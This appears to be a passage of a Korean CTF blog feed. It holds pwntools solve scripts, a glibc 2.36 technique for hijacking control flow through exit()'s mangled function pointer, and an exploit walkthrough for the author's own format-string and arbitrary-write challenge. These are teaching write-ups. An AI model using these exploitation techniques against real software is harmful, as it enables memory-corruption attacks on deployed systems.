class="line">p = remote(<span class="string">&quot;sunshinectf.games&quot;</span>, <span class="number">22000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;CTF team?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x14</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">info(<span class="built_in">str</span>(seed))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argv1 = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">argv1[<span class="number">1</span>] = <span class="built_in">str</span>(seed)</span><br><span class="line"></span><br><span class="line">pp = process(executable=<span class="string">&#x27;./a.out&#x27;</span>, argv=argv1)</span><br><span class="line"></span><br><span class="line">v7 = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    v7[i] = pp.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pp.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;[&gt;]&#x27;</span>, v7[i])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc random.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*printf(&quot;%s\n&quot;, argv[1]);*/</span></span><br><span class="line">    <span class="comment">/*printf(&quot;%d\n&quot;, atoi(argv[1]));*/</span></span><br><span class="line">    </span><br><span class="line">    srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">10</span>; i &lt; <span class="number">999999999</span>; i *= <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v7 = rand() % i + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v7);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="struct-unpack"><a href="#struct-unpack" class="headerlink" title="struct.unpack"></a>struct.unpack</h4><p><code>struct.unpack</code>의 첫번째 인자로 I를 주면 byte를 unsigned int로 바꾸어주는 것을 알게 되었다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;i&#x27;, b&#x27;\x7f\x84\x4e\xcd&#x27;)</span><br><span class="line">(-850492289,)</span><br><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;I&#x27;, b&#x27;\x7f\x84\x4e\xcd&#x27;)</span><br><span class="line">(3444475007,)</span><br></pre></td></tr></table></figure><p><code>struct.unpack</code>만 보면 어색했는데 이제 조금 익숙해졌다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun&#123;gu355y_ch4ll3ng35_4r3_my_f4v0r1t3!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> random </tag>
            
            <tag> srand </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to RIP control in libc 2.36</title>
      <link href="/221122-how_to_rip_control_in_libc236/"/>
      <url>/221122-how_to_rip_control_in_libc236/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>위 문제를 libc 2.36의 <code>exit</code> 함수의 <code>call rax</code> 가젯을 이용하여 익스플로잇하는 과정이다.</p><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>때는 바야흐로 약 한 달 전.. POXX 2022 본선 문제 출제를 하던 중이었다. 해당 문제는 fsb와 aaw가 가능하지만 FULL RELRO가 걸려있어 GOT overwriting은 불가능 해서 일반적으로 <code>malloc_hook</code>이나 <code>free_hook</code>을 덮어서 익스해야 한다. 하지만 해당 문제에서의 libc 버전이 최신 버전(2.36) 이기 때문에 위와 같은 방법은 익스가 불가능하다. 왜냐하면 둘 다 사용을 안하는 것으로 패치되었기 때문이다. 해당 과정을 분석하게 된 계기는, printf에서의 malloc 호출과 exit에서의 free 호출을 살펴보면서 분석하게 되었다. </p><p><code>malloc_hook</code>과 <code>free_hook</code>을 사용하지 않는 익스 방법이 있을까 분석을 진행하다가 <code>exit</code> 함수에서 <code>call rax</code> 라는 쓸만한 가젯을 보았고 해당 부분 트리거를 진행해보았다. 물론 여러가지의 시행착오가 있었지만 한 달 전의 일이라 기억이 가물하기도 해서 트리거에 성공한 과정만 간략하게 블로그에 작성해보겠다.</p><h2 id="How-to-RIP-control-in-libc-2-36"><a href="#How-to-RIP-control-in-libc-2-36" class="headerlink" title="How to RIP control in libc 2.36"></a>How to RIP control in libc 2.36</h2><p><img src="/images/221122-how_to_rip_control_in_libc236/221122-1.png" alt="img1">  </p><p>주목할 가젯은 <code>loc_3AF9E</code>의 <code>call rax</code>이고 <code>rax</code>에 집중 및 동적 분석을 통해 최종적으로 분석할 블록은 <code>loc_3AF70</code>이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000003AF70</span><br><span class="line">.text:000000000003AF70 loc_3AF70:</span><br><span class="line">.text:000000000003AF70 add     rdx, r15</span><br><span class="line">.text:000000000003AF73 mov     rax, [rdx+18h]</span><br><span class="line">.text:000000000003AF77 mov     r13, [rdx+20h]</span><br><span class="line">.text:000000000003AF7B mov     qword ptr [rdx+10h], 0</span><br><span class="line">.text:000000000003AF83 mov     edx, ebx</span><br><span class="line">.text:000000000003AF85 ror     rax, 11h</span><br><span class="line">.text:000000000003AF89 xor     rax, fs:30h</span><br><span class="line">.text:000000000003AF92 xchg    edx, [r14]</span><br><span class="line">.text:000000000003AF95 cmp     edx, 1</span><br><span class="line">.text:000000000003AF98 jg      loc_3B0B0</span><br></pre></td></tr></table></figure><p>$rax 값을 [rdx+18h]에서 가져와서, ROR 연산을 시도한다. 그 후 XOR 연산도 진행한다. 이러한 두 번의 연산을 거쳐서 결국 <code>call rax</code>를 한다. 우리는 임의 주소 쓰기가 가능하기 때문에 rax를 조작할 수 있는 상황이다. 더 나아가서 생각해보면 [rdx+18h]을 직접 조작할 수 있고, 해당 값은 우리가 호출하고 싶은 주소가 signing 된 값임을 알 수 있다.</p><p>역연산을 통해 signing 된 값이 무엇인지 수식으로 작성해보면 아래와 같다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"></span><br><span class="line">sign = ROL(e.sym[<span class="string">&#x27;gift&#x27;</span>] ^ key, <span class="number">0x11</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>signing 된 값을 구하기 위해 key를 알아야 한다. 0x3AF89에 break point를 걸고 rax 레지스터를 0으로 세팅하면 아래의 식에 의해 <code>fs:30h</code> 값을 구할 수 있다. 이 값이 key이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 ^ A = A</span><br></pre></td></tr></table></figure><p>그렇게 구한 <code>fs:30h</code>을 메모리 상에서 검색해보면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x7801dafd8bba0173</span><br><span class="line">[+] Searching &#x27;\x73\x01\xba\x8b\xfd\xda\x01\x78&#x27; in memory</span><br><span class="line">[+] In (0x7fedbeb04000-0x7fedbeb07000), permission=rw-</span><br><span class="line">  0x7fedbeb04770 - 0x7fedbeb04790  →   &quot;\x73\x01\xba\x8b\xfd\xda\x01\x78[...]&quot;</span><br><span class="line">[+] In &#x27;/usr/lib/ld-linux-x86-64.so.2&#x27;(0x7fedbed37000-0x7fedbed39000), permission=r--</span><br><span class="line">  0x7fedbed38a70 - 0x7fedbed38a90  →   &quot;\x73\x01\xba\x8b\xfd\xda\x01\x78[...]&quot;</span><br><span class="line">[+] In &#x27;[stack]&#x27;(0x7fff23bf6000-0x7fff23c17000), permissdfsd</span><br><span class="line"></span><br><span class="line">\xfd\xda\x01\x78[...]&quot;</span><br></pre></td></tr></table></figure><p>stack에 이미 해당 값이 존재하고 있었고, 해당 문제에서 fsb 터지는 주소가 더 높은 곳에 위치했기 때문에 <code>fs:30h</code>을 leak할 수 있다.</p><p>다만 key 값이 한 바이트 밀려 있어서(?) 조금의 전처리 과정이 필요하다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff23c14cf0: 0x01dafd8bba0173f5      0x0034365f36387878</span><br></pre></td></tr></table></figure><p>leak1 &#x3D; 0x01dafd8bba0173f5<br>leak2 &#x3D; 0x0034365f36387878</p><p>leak1에서 맨 마지막 바이트를 자르고 leak2에서 맨 마지막 바이트를 가져와 맨 앞에 붙여줘야 한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak1 &gt;&gt; 8 = 0x1dafd8bba0173</span><br><span class="line">leak2 &amp; 0xff = 0x78</span><br></pre></td></tr></table></figure><p>최종적으로 아래와 같은 수식을 통해 key 값을 구할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = (leak1 &gt;&gt; 8) + ((leak2 &amp; 0xff) &lt;&lt; 8*7)</span><br><span class="line">key = 0x7801dafd8bba0173</span><br></pre></td></tr></table></figure><p>결론적으로 우리는 key를 구했으므로 gift 함수가 signing 된 값을 구하고 스택에 값을 쓸 수 있다. 이 값은 exit 함수의 로직 중 인증이 되어 최종적으로 call 할 수 있다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)</title>
      <link href="/221121-poxx2022-shop_revenge/"/>
      <url>/221121-poxx2022-shop_revenge/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(0&#x2F;10) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>저번에는 이거 shell로 바꿔주셨잖아요..</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── chall</span><br></pre></td></tr></table></figure><p>Dockerfile에서 libc를 추출해서 patch한 다음에 문제를 풀어야 한다. 참고로 최신 libc이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>No canary found라고 나오지만 canary가 존재한다.</p><p>FULL RELRO라서 GOT overwriting이 불가능하다. 그래서 보통 <code>malloc_hook</code>, <code>free_hook</code>, <code>_rtld_global._dl_rtld_lock_recursive</code> 등을 덮어 실행 흐름을 조작할 수 있다. 하지만 문제에서 최신 libc를 사용하기 때문에 <code>malloc_hook</code>과 <code>free_hook</code> 등을 덮는 것은 불가능하고 덮을 다른 곳을 찾아봐야 한다.</p><h3 id="Souece-Code"><a href="#Souece-Code" class="headerlink" title="Souece Code"></a>Souece Code</h3><p>ida 전체 코드이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  _BYTE nptr[<span class="number">23</span>]; <span class="comment">// [rsp+29h] [rbp-17h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">15</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">176LL</span>);</span><br><span class="line">  buf = &amp;v4;</span><br><span class="line">  *(_QWORD *)nptr = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">7</span>] = <span class="number">0LL</span>;</span><br><span class="line">  initialize(argc, argv, <span class="number">8LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*** POXX Shop! ***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Buy&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Exchange&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Return&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What do you want for return?&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0xA0</span>uLL);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, It&#x27;s impossible.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">110</span>) )</span><br><span class="line">          <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">        v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">        v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        *v7 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>아래 1번 메뉴와 2번 메뉴에서 각각 취약점이 존재하며, 해당 취약점을 이용해서 익스플로잇 코드 작성이 가능하다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&#x27;n&#x27;</span>) )</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);            <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">  v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">  v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  *v7 = v8;                               <span class="comment">// aaw</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>먼저 1번 메뉴를 살펴보자. buf에 입력을 받고 <code>printf</code>로 출력을 해준다. 이 때 fsb가 발생하지만 ‘n’을 필터링하고 있기 때문에 스택 주소 leak만 가능하다.</p><p>2번 메뉴에서는 <code>*v7 = v8;</code> 이 구문을 통해 원하는 주소에 원하는 값을 쓸 수 있다. 다시 말해서 임의 주소 쓰기가 가능하다.</p><p>이때 <code>strtoul</code>을 이용해서 정수로 구성된 str을 unsigned long으로 바꿔준다. </p><p>v7에 0x7ffcea69ddf0를 넣고 싶다면? <code>read</code>에서 nptr에 해당 값을 입력해야한다. 그럼 <code>strtoul</code> 함수의 인자는 아래와 같이 들어가게 된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strtoul@plt (</span><br><span class="line">   $rdi = 0x007ffcea69de19 → &quot;140724241292784&quot;,</span><br><span class="line">   $rsi = 0x00000000000000,</span><br><span class="line">   $rdx = 0x0000000000000a</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>그리고 반환값은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0x007ffcea69ddf0</span><br></pre></td></tr></table></figure><p>출제자의 입장에서 v7을 위한 nptr을 입력받을 때 왜 size가 0xF인 이유를 설명해보겠다. </p><p>보통 인텔 64bit에서 립시나 스택 주소는 0x7f로 시작하게 되고, 못해도 원하는 입력하고 싶은 주소의 범위는 아래와 같을 것이라고 생각했다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f0000000000 ~ 0x7fffffffffff</span><br><span class="line">139637976727552 ~ 140737488355327</span><br></pre></td></tr></table></figure><p>이 값은 <code>strtoul</code> 함수에 의해 문자열(예를 들면 140737488355327)이 unsigned long으로 바뀌게 되므로, 입력하는 글자 수를 <code>len(&#39;140737488355327&#39;)=15</code>로 제한하게 되었다.</p><p>또한 v8을 위한 nptr 입력도 0x14로 특별히 제한한 이유가 있다. 이 글의 언인텐이 아닌 다음 글의 언인텐을 위해서다. (출제할 때부터 인지하고 있었던 언인텐이고 일부러 입력 크기를 0x14로 두고 언인텐을 방지하지 않았다.) </p><p>이에 관해서는 다음 글에서 설명하도록 한다.</p><h2 id="Vunlerability"><a href="#Vunlerability" class="headerlink" title="Vunlerability"></a>Vunlerability</h2><p>아무리 봐도 bof는 터지지 않는다. 임의 주소 쓰기와 스택 주소 leak을 이용하여 Exploit을 진행해보자.</p><p>스택에 있는 주소를 모두 출력할 수 있다는 것은 강력한 취약점이다. pie base, libc base, stack address 등을 바로 구할 수 있기 때문이다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>인텐과 언인텐 하나씩 소개한다. 인텐은 스택 ret를 gift 함수로 덮는 것이다. 이 문제는 예선 때 냈던 문제를 살짝 바꿔서 낸 문젠데 예선 때 풀어주신 분들이 모두 똑같은 방식(언인텐)으로 푸셔서 그 부분을 패치해서 냈다. </p><p>목표는 1. 패치를 통해 예선 때의 언인텐 풀이가 불가능 한 것, 2. 포너블 올클 방지 였다. 예선 때의 언인텐은 main 함수가 <code>return 0</code>으로 종료되어서 스택 ret를 gift함수 주소로 바꿔서 풀이하는 것이다. 이것을 방지하기 위해 main이 종료하는 부분을 <code>exit(0)</code>으로 변경하였다. 본선 문제를 풀이할 때 read 함수의 ret를 덮지 않고 풀이를 했으나 해당 방식은 익스하는데 오랜 시간이 걸려서 다른 익스 방식을 탐색하였다. 결국 예선 언인텐과 비슷한 방식의 풀이를 본선 인텐으로 채택하였다. 재밌는 것은 대회 끝나고 해당 문제를 풀이하려고 하신 분의 익스 코드를 살펴봤는데 이 방법이 아니라 다른 방법으로 시도하고 계셨다.. 이 방법도 해당 글에 소개하도록 하겠다.</p><h2 id="Exploit-Scnario-1-intend"><a href="#Exploit-Scnario-1-intend" class="headerlink" title="Exploit Scnario 1 (intend)"></a>Exploit Scnario 1 (intend)</h2><ol><li>stack address를 구한 뒤, loop 횟수 변경</li><li>pie base 구하기</li><li>buf를 read ret로 변경 후 gift 입력 (read ret를 gift)</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;43.201.142.219&#x27;, 49166)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span 